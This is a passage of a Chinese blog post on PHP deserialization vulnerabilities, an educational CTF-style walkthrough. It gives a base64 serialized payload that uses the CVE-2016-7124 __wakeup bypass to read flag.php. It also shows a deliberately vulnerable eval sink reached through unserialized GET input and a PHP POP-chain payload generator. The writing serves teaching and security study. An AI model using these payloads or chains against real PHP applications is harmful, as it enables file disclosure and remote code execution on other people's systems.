class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span> ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析一下源码，<code>__destruct方法中show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);</code>会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，<code>但是__wakeup会在unserialize之前执行，所以要绕过这一点。</code></p>
+<p><strong>这里就要用到CVE-2016-7124漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
+<p>构造序列化对象：O:5:”SoFun”:<strong>1</strong>:{S:7:”\00<em>\00file”;s:8:”flag.php”;}<br>绕过__wakeup：O:5:”SoFun”:*</em>2*<em>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}</p>
+<p>注意：因为file是protect属性，所以需要加上\00*\00。再base64编码。<br>payload：Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p>
+<h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h2 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h2><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p>
+<h2 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
+<h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;zhaibaba);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p>
+<ol>
+<li>string1中的<strong>tostring存在$this-&gt;str1-&gt;get_flag()，分析一下要自动调用</strong>tostring()需要把类string1当成字符串来使用，因为调用的是参数str1的方法，所以需要把str1赋值为类GetFlag的对象。</li>
+<li>发现类func中存在<strong>invoke方法执行了字符串拼接，需要把func当成函数使用自动调用</strong>invoke然后把$mod1赋值为string1的对象与$mod2拼接。</li>
+<li>在funct中找到了函数调用，需要把mod1赋值为func类的对象，又因为函数调用在__call方法中，且参数为$test2,即无法调用test2方法时自动调用 __call方法；</li>
+<li>在Call中的test1方法中存在$this-&gt;mod1-&gt;test2();，需要把$mod1赋值为funct的对象，让__call自动调用。</li>
+<li>查找test1方法的调用点，在start_gg中发现$this-&gt;mod1-&gt;test1();，把$mod1赋值为start_gg类的对象，等待__destruct()自动调用。</li>
+</ol>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();<span class="comment">//把$mod1赋值为Call类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();<span class="comment">//把 $mod1赋值为funct类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> func();<span class="comment">//把 $mod1赋值为func类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1= <span class="keyword">new</span> string1();<span class="comment">//把 $mod1赋值为string1类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1= <span class="keyword">new</span> GetFlag();<span class="comment">//把 $str1赋值为GetFlag类对</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;zhaibaba = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $zhaibaba;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP序列化是什么"><span class="toc-number">1.</span> <span class="toc-text">PHP序列化是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#铺垫知识"><span class="toc-number">1.1.</span> <span class="toc-text">铺垫知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例序列化"><span class="toc-number">1.1.1.</span> <span class="toc-text">示例序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列实例"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#魔术方法"><span class="toc-number">2.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#比较重要的方法"><span class="toc-number">2.1.</span> <span class="toc-text">比较重要的方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反序列化对象注入"><span class="toc-number">3.</span> <span class="toc-text">反序列化对象注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过-wakeup-方法"><span class="toc-number">3.1.</span> <span class="toc-text">绕过__wakeup()方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP链构造"><span class="toc-number">4.</span> <span class="toc-text">POP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POP：面向属性编程"><span class="toc-number">4.1.</span> <span class="toc-text">POP：面向属性编程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本概念"><span class="toc-number">4.2.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP链利用"><span class="toc-number">4.3.</span> <span class="toc-text">POP链利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#训练"><span class="toc-number">4.4.</span> <span class="toc-text">训练</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&text=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&is_video=false&description=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php反序列化漏洞解析和研究&body=Check out this article: https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&name=php反序列化漏洞解析和研究&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&t=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    Zeo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
